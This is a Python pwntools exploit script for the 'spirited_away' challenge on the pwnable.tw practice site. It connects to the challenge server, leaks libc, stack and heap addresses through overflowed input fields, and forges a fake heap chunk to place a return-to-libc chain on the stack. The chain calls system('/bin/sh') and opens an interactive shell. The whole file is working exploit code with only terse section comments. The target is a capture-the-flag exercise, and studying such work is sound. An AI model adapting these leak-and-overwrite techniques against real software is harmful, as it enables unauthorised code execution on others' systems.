
#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("spirited_away_patched")
libc = ELF("./libc_32.so.6")
#ld = ELF("./ld-2.27.so")

local = False 
if local:
    p = process("./spirited_away_patched")
    #gdb.attach(p,'''c''')
else:
    p = remote('chall.pwnable.tw', 10204)

elf = context.binary = ELF('./spirited_away_patched', checksec=False)

#Name to *buf
#Age to  v5
def name_func(name, age, why, cmt):
    p.sendlineafter(b"name:", name)             #60
    p.sendlineafter(b"age:", age)
    p.sendlineafter(b"movie?", why)             #80
    p.sendlineafter(b"comment:", cmt)           #60

#############
# Leak_libc #
#############

name_func(b"A"*20, str(-1), b"B"*20, b"C"*20)
p.recvuntil(b"Reason: BBBBBBBBBBBBBBBBBBBB")
libc.address = int.from_bytes(p.recv(4), 'little') - 389642
print("[+]Libc_base:    ", hex(libc.address))

##############
# Leak_stack #
##############

p.sendlineafter(b"comment? <y/n>:", b"y")
name_func(b"A"*20, str(-1), b"B"*79, b"C"*20)

p.recvuntil(b"B"*79 + b"\x0a")
ebp = int.from_bytes(p.recv(4), 'little') - 32
print("[+]Ebp_leak:    ", hex(ebp)) 

#############
# Leak_heap #
#############

for i in range(8):
    p.sendlineafter(b"comment? <y/n>:", b"y")
    name_func(b"x", str(i), b"x", b"x")
    print(i+2)

p.sendlineafter(b"comment? <y/n>:", b"y")
p.sendlineafter(b"age:", b"a")
p.sendlineafter(b"movie?", b"a")

for i in range(89):
    p.sendlineafter(b"comment? <y/n>:", b"y"*3)
    print(i+3+7)


p.sendlineafter(b"comment? <y/n>:", b"y")
p.sendlineafter(b"name:", b"a")
p.sendafter(b"movie?", b"a")
p.sendlineafter(b"comment:", b"a"*83)
p.recvuntil(b"a"*83 + b"\x0a")
heap_addr = int.from_bytes(p.recv(4), 'little')
print("[+]Heap_leak:    ", hex(heap_addr))

p.sendlineafter(b"comment? <y/n>:", b"y")
p.sendlineafter(b"name:", b"a")
p.sendafter(b"movie?", p32(0x0) + p32(0x41) + b"a"*0x38 + p32(0x0) + p32(0x0001fbb1))
p.sendafter(b"comment:", b"a"*84 + p64(ebp-0x48))

p.sendlineafter(b"comment? <y/n>:", b"y")

ret = 0x0000018b + libc.address
payload = flat(
    cyclic(0x48),
    p32(ret),
    p32(libc.sym['system']),
    p32(libc.sym['system']),
    p32(next(libc.search(b'/bin/sh')))
)
p.sendlineafter(b"name:", payload)
p.sendafter(b"movie?", b"a")
p.sendafter(b"comment:", b"a")
p.sendlineafter(b"comment? <y/n>:", b"n")

'''
Local and sever are  different
'''

p.interactive()
